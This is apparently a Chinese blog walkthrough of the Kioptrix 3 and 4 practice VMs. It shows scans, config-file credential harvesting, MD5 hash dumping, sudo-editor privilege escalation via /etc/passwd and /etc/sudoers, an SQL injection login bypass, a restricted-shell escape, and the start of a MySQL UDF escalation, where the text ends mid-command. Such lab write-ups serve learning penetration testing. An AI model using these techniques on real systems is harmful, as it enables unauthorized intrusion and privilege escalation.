class="line">==&gt; DIRECTORY: http://kioptrix3.com/style/                                                                                                                   </span><br><span class="line">==&gt; DIRECTORY: http://kioptrix3.com/cache/                                                                                                                   </span><br><span class="line">==&gt; DIRECTORY: http://kioptrix3.com/phpmyadmin/                                                                                                              </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">---- Entering directory: http://kioptrix3.com/modules/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode &apos;-w&apos; if you want to scan it anyway)</span><br><span class="line">                                                                                                                                                             </span><br><span class="line">---- Entering directory: http://kioptrix3.com/gallery/ ----</span><br><span class="line">==&gt; DIRECTORY: http://kioptrix3.com/gallery/themes/                                                                                                          </span><br><span class="line">==&gt; DIRECTORY: http://kioptrix3.com/gallery/photos/                                                                                                          </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">---- Entering directory: http://kioptrix3.com/core/ ----</span><br><span class="line">==&gt; DIRECTORY: http://kioptrix3.com/core/view/                                                                                                               </span><br><span class="line">==&gt; DIRECTORY: http://kioptrix3.com/core/lib/                                       </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>发现有phpmyadmin，默认密码root/root登录失败，已经拿到了shell，获得mysql密码只要去看下配置文件</p>
<h3 id="数据库配置文件"><a href="#数据库配置文件" class="headerlink" title="数据库配置文件"></a>数据库配置文件</h3><p>来到网站的家目录，寻找下数据库的配置文件</p>
<ol>
<li><code>grep &quot;localhost&quot; ./ -R</code></li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;localhost&quot; ./ -R</span><br><span class="line">./gallery/gconfig.php:	$GLOBALS[&quot;gallarific_mysql_server&quot;] = &quot;localhost&quot;;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><code>ls -l -R | grep config</code></li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">www-data@Kioptrix3:/home/www/kioptrix3.com$ ls -l -R | grep config</span><br><span class="line">ls -l -R | grep config</span><br><span class="line">drwxrwxrwx  3 root root 4096 Apr 14  2011 config</span><br><span class="line">./data/config:</span><br><span class="line">./data/config/modules:</span><br><span class="line">-rwxrwxrwx 1 root root  369 Aug  3  2010 config.txt</span><br><span class="line">-rw-r--r-- 1 root root  1440 Apr 14  2011 gconfig.php</span><br><span class="line"></span><br><span class="line">www-data@Kioptrix3:/home/www/kioptrix3.com$ locate gconfig.php</span><br><span class="line">locate gconfig.php</span><br><span class="line">/home/www/kioptrix3.com/gallery/gconfig.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">www-data@Kioptrix3:/home/www/kioptrix3.com$ cat /home/www/kioptrix3.com/gallery/gconfig.php</span><br><span class="line">&lt;w/kioptrix3.com$ cat /home/www/kioptrix3.com/gallery/gconfig.php            </span><br><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	/*</span><br><span class="line">		A sample Gallarific configuration file. You should edit</span><br><span class="line">		the installer details below and save this file as gconfig.php</span><br><span class="line">		Do not modify anything else if you don&apos;t know what it is.</span><br><span class="line">	*/</span><br><span class="line"></span><br><span class="line">	// Installer Details -----------------------------------------------</span><br><span class="line"></span><br><span class="line">	// Enter the full HTTP path to your Gallarific folder below,</span><br><span class="line">	// such as http://www.yoursite.com/gallery</span><br><span class="line">	// Do NOT include a trailing forward slash</span><br><span class="line"></span><br><span class="line">	$GLOBALS[&quot;gallarific_path&quot;] = &quot;http://kioptrix3.com/gallery&quot;;</span><br><span class="line"></span><br><span class="line">	$GLOBALS[&quot;gallarific_mysql_server&quot;] = &quot;localhost&quot;;</span><br><span class="line">	$GLOBALS[&quot;gallarific_mysql_database&quot;] = &quot;gallery&quot;;</span><br><span class="line">	$GLOBALS[&quot;gallarific_mysql_username&quot;] = &quot;root&quot;;</span><br><span class="line">	$GLOBALS[&quot;gallarific_mysql_password&quot;] = &quot;fuckeyou&quot;;</span><br><span class="line"></span><br><span class="line">	// Setting Details -------------------------------------------------</span><br><span class="line"></span><br><span class="line">if(!$g_mysql_c = @mysql_connect($GLOBALS[&quot;gallarific_mysql_server&quot;], $GLOBALS[&quot;gallarific_mysql_username&quot;], $GLOBALS[&quot;gallarific_mysql_password&quot;])) &#123;</span><br><span class="line">		echo(&quot;A connection to the database couldn&apos;t be established: &quot; . mysql_error());</span><br><span class="line">		die();</span><br><span class="line">&#125;else &#123;</span><br><span class="line">	if(!$g_mysql_d = @mysql_select_db($GLOBALS[&quot;gallarific_mysql_database&quot;], $g_mysql_c)) &#123;</span><br><span class="line">		echo(&quot;The Gallarific database couldn&apos;t be opened: &quot; . mysql_error());</span><br><span class="line">		die();</span><br><span class="line">	&#125;else &#123;</span><br><span class="line">		$settings=mysql_query(&quot;select * from gallarific_settings&quot;);</span><br><span class="line">		if(mysql_num_rows($settings)!=0)&#123;</span><br><span class="line">			while($data=mysql_fetch_array($settings))&#123;</span><br><span class="line">				$GLOBALS[&quot;&#123;$data[&apos;settings_name&apos;]&#125;&quot;]=$data[&apos;settings_value&apos;];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="mysql本地登录"><a href="#mysql本地登录" class="headerlink" title="mysql本地登录"></a>mysql本地登录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -u root -p</span><br><span class="line">mysql -u root -p</span><br><span class="line">Enter password: fuckeyou</span><br><span class="line"></span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 11</span><br><span class="line">Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the buffer.</span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema | </span><br><span class="line">| gallery            | </span><br><span class="line">| mysql              | </span><br><span class="line">+--------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use gallery;</span><br><span class="line">use gallery;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+----------------------+</span><br><span class="line">| Tables_in_gallery    |</span><br><span class="line">+----------------------+</span><br><span class="line">| dev_accounts         | </span><br><span class="line">| gallarific_comments  | </span><br><span class="line">| gallarific_galleries | </span><br><span class="line">| gallarific_photos    | </span><br><span class="line">| gallarific_settings  | </span><br><span class="line">| gallarific_stats     | </span><br><span class="line">| gallarific_users     | </span><br><span class="line">+----------------------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from dev_accounts;</span><br><span class="line">select * from dev_accounts;</span><br><span class="line">+----+------------+----------------------------------+</span><br><span class="line">| id | username   | password                         |</span><br><span class="line">+----+------------+----------------------------------+</span><br><span class="line">|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 | </span><br><span class="line">|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e | </span><br><span class="line">+----+------------+----------------------------------+</span><br><span class="line">2 rows in set (0.10 sec)</span><br></pre></td></tr></table></figure>

<h3 id="phpmydamin登录"><a href="#phpmydamin登录" class="headerlink" title="phpmydamin登录"></a>phpmydamin登录</h3><p>得到<code>root</code> <code>fuckeyou</code>，phpmyadmin成功登录</p>
<p>找到<code>dev_accounts</code>表中的两个字段,猜测是<code>dreg</code>和<code>loneferret</code>用户的登录密码</p>
<p><code>dreg</code> <code>0d3eccfb887aabd50f243b3f155c0f85</code></p>
<p><code>loneferret</code> <code>5badcaf789d3d1d09794d8f021f40f0e</code></p>
<p><img src="https://s1.ax1x.com/2018/10/19/iwLhqO.png" alt="iwLhqO.png"></p>
<p>md5解密得到<code>loneferret</code>的密码为<code>starwars</code></p>
<h2 id="ssh登录提权"><a href="#ssh登录提权" class="headerlink" title="ssh登录提权"></a>ssh登录提权</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# ssh loneferret@192.168.214.140</span><br><span class="line">The authenticity of host &apos;192.168.214.140 (192.168.214.140)&apos; can&apos;t be established.</span><br><span class="line">RSA key fingerprint is SHA256:NdsBnvaQieyTUKFzPjRpTVK6jDGM/xWwUi46IR/h1jU.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added &apos;192.168.214.140&apos; (RSA) to the list of known hosts.</span><br><span class="line">loneferret@192.168.214.140&apos;s password: </span><br><span class="line">Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">To access official Ubuntu documentation, please visit:</span><br><span class="line">http://help.ubuntu.com/</span><br><span class="line">Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106</span><br><span class="line">loneferret@Kioptrix3:~$ id</span><br><span class="line">uid=1000(loneferret) gid=100(users) groups=100(users)</span><br></pre></td></tr></table></figure>

<p>登录成功，执行<code>sudo -l</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo -l</span><br><span class="line">User loneferret may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: !/usr/bin/su</span><br><span class="line">    (root) NOPASSWD: /usr/local/bin/ht</span><br></pre></td></tr></table></figure>

<p>能执行之前提到的<code>sudo ht</code>命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo ht</span><br><span class="line">Error opening terminal: xterm-256color.</span><br></pre></td></tr></table></figure>

<p>报错，是显示颜色的问题，执行<code>export TERM=xterm</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">loneferret@Kioptrix3:~# echo $TERM</span><br><span class="line">xterm-256color</span><br><span class="line">loneferret@Kioptrix3:~# export TERM=xterm</span><br><span class="line">loneferret@Kioptrix3:~# echo $TERM</span><br><span class="line">xterm</span><br></pre></td></tr></table></figure>

<p>然后就能正常运行<code>sudo ht</code>命令，<code>ht</code>是个编辑器，<code>sudo ht</code>就能以root权限修改一些文件来提权</p>
<h3 id="修改-etc-passwd"><a href="#修改-etc-passwd" class="headerlink" title="修改/etc/passwd"></a>修改/etc/passwd</h3><p><code>F3</code>打开<code>/etc/passwd</code>文件，将当前用户uid改为0（root权限），保存退出，重新ssh登录后就能得到root权限</p>
<p><img src="https://s1.ax1x.com/2018/10/19/iwLfsK.png" alt="iwLfsK.png"></p>
<h3 id="修改-etc-sudoers"><a href="#修改-etc-sudoers" class="headerlink" title="修改/etc/sudoers"></a>修改/etc/sudoers</h3><p>修改当前用户允许sudo使用的命令，加上个bash，得到root权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo -l</span><br><span class="line">User loneferret may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: !/usr/bin/su</span><br><span class="line">    (root) NOPASSWD: /usr/local/bin/ht</span><br><span class="line">    (root) NOPASSWD: /bin/bash</span><br><span class="line">loneferret@Kioptrix3:~$ sudo bash</span><br><span class="line">root@Kioptrix3:/home/loneferret# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<p><img src="https://s1.ax1x.com/2018/10/19/iwLWM6.png" alt="iwLWM6.png"></p>
<p>或者直接改为<code>loneferret ALL=(ALL) ALL</code>获得sudo执行所有命令的权限</p>
<p><img src="https://s1.ax1x.com/2018/10/19/iwL7id.png" alt="iwL7id.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo -l</span><br><span class="line">[sudo] password for loneferret: </span><br><span class="line">User loneferret may run the following commands on this host:</span><br><span class="line">    (ALL) ALL</span><br><span class="line">loneferret@Kioptrix3:~$ sudo su</span><br><span class="line">root@Kioptrix3:/home/loneferret# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<h2 id="其他的"><a href="#其他的" class="headerlink" title="其他的"></a>其他的</h2><p>在网站的<code>/gallery</code>的站点名是<code>Gallarifc</code>，搜索下发现存在sql注入漏洞<br><a href="https://www.exploit-db.com/exploits/15891/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/15891/</a></p>
<p><img src="https://s1.ax1x.com/2018/10/19/iwLHJA.png" alt="iwLHJA.png"></p>
<p>可以直接sql注入拿到用户的密码</p>
<h1 id="Kioptrix-4"><a href="#Kioptrix-4" class="headerlink" title="Kioptrix#4"></a>Kioptrix#4</h1><ul>
<li>靶机 ip 192.168.214.142</li>
<li>kali ip 192.168.214.139</li>
</ul>
<p>nmap扫描</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sS -A 192.168.214.142 </span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-23 08:43 EDT</span><br><span class="line">Nmap scan report for 192.168.214.142</span><br><span class="line">Host is up (0.00024s latency).</span><br><span class="line">Not shown: 566 closed ports, 430 filtered ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)</span><br><span class="line">|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html).</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 00:0C:29:12:42:B6 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.33</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 10h00m01s, deviation: 2h49m43s, median: 8h00m00s</span><br><span class="line">|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Unix (Samba 3.0.28a)</span><br><span class="line">|   Computer name: Kioptrix4</span><br><span class="line">|   NetBIOS computer name: </span><br><span class="line">|   Domain name: localdomain</span><br><span class="line">|   FQDN: Kioptrix4.localdomain</span><br><span class="line">|_  System time: 2018-10-23T16:43:33-04:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.25 ms 192.168.214.142</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 21.05 seconds</span><br></pre></td></tr></table></figure>

<p>可以看到开启了22，80，139，445端口，也能扫描到smb的版本号，搜了下没发现有能利用的漏洞</p>
<p>打开主页，是一个用户登陆的界面，先尝试了下<code>admin</code>等弱口令和万能密码</p>
<p>当输入账号密码错误时提示</p>
<p><img src="https://s1.ax1x.com/2018/10/24/isB6aT.png" alt="isB6aT.png"></p>
<p>密码使用<code>admin&#39;or&#39;1&#39;=&#39;1</code></p>
<p><img src="https://s1.ax1x.com/2018/10/24/isBcIU.png" alt="isBcIU.png"></p>
<p>能看到是登陆成功，但没有admin这个账户</p>
<p>在以上测试的时候我同时使用了dirbuster来扫目录，发现了<code>john</code>和<code>robert</code>这两个目录和php页面，我猜大概是用户，尝试登录，成功，显示出账号和密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Username	:	john</span><br><span class="line">Password	:	MyNameIsJohn</span><br><span class="line"></span><br><span class="line">Username	:	robert</span><br><span class="line">Password	:	ADGAdsafdfwt4gadfga==</span><br></pre></td></tr></table></figure>

<p>尝试ssh登录，成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# ssh john@192.168.214.143</span><br><span class="line">The authenticity of host &apos;192.168.214.143 (192.168.214.143)&apos; can&apos;t be established.</span><br><span class="line">RSA key fingerprint is SHA256:3fqlLtTAindnY7CGwxoXJ9M2rQF6nn35SFMTVv56lww.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)? yes</span><br><span class="line">Warning: Permanently added &apos;192.168.214.143&apos; (RSA) to the list of known hosts.</span><br><span class="line">john@192.168.214.143&apos;s password: </span><br><span class="line">Welcome to LigGoat Security Systems - We are Watching</span><br><span class="line">== Welcome LigGoat Employee ==</span><br><span class="line">LigGoat Shell is in place so you  don&apos;t screw up</span><br><span class="line">Type &apos;?&apos; or &apos;help&apos; to get the list of allowed commands</span><br><span class="line">john:~$ id</span><br><span class="line">*** unknown command: id</span><br><span class="line">john:~$ ?</span><br><span class="line">cd  clear  echo  exit  help  ll  lpath  ls</span><br><span class="line">john:~$</span><br></pre></td></tr></table></figure>

<p>但给的shell不是一般的shell，限制了只能使用<code>cd  clear  echo  exit  help  ll  lpath  ls</code>这些命令</p>
<p>搜索发现这个叫做Lshell <a href="https://www.aldeid.com/wiki/Lshell" target="_blank" rel="noopener">https://www.aldeid.com/wiki/Lshell</a></p>
<p><code>echo os.system(&#39;/bin/bash&#39;)</code>绕过lshell的限制获取bash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">john:~$ echo os.system(&apos;/bin/bash&apos;)</span><br><span class="line">john@Kioptrix4:~$ id</span><br><span class="line">uid=1001(john) gid=1001(john) groups=1001(john)</span><br><span class="line">john@Kioptrix4:~$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">dhcp:x:101:102::/nonexistent:/bin/false</span><br><span class="line">syslog:x:102:103::/home/syslog:/bin/false</span><br><span class="line">klog:x:103:104::/home/klog:/bin/false</span><br><span class="line">mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false</span><br><span class="line">sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">loneferret:x:1000:1000:loneferret,,,:/home/loneferret:/bin/bash</span><br><span class="line">john:x:1001:1001:,,,:/home/john:/bin/kshell</span><br><span class="line">robert:x:1002:1002:,,,:/home/robert:/bin/kshell</span><br><span class="line">john@Kioptrix4:~$ uname -a</span><br><span class="line">Linux Kioptrix4 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux</span><br><span class="line">john@Kioptrix4:~$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:	Ubuntu</span><br><span class="line">Description:	Ubuntu 8.04.3 LTS</span><br><span class="line">Release:	8.04</span><br><span class="line">Codename:	hardy</span><br></pre></td></tr></table></figure>

<p>查看网站根目录下页面的源码，能发现数据库的用户密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">john@Kioptrix4:/var/www$ cat checklogin.php </span><br><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line">$host=&quot;localhost&quot;; // Host name</span><br><span class="line">$username=&quot;root&quot;; // Mysql username</span><br><span class="line">$password=&quot;&quot;; // Mysql password</span><br><span class="line">$db_name=&quot;members&quot;; // Database name</span><br><span class="line">$tbl_name=&quot;members&quot;; // Table name</span><br></pre></td></tr></table></figure>

<p>给的是mysql的root用户，尝试利用udf来提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">john@Kioptrix4:~$ mysql -uroot</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 1</span><br><span class="line">Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the buffer.</span><br><span class="line"></span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; create function sys_exec returns integer soname 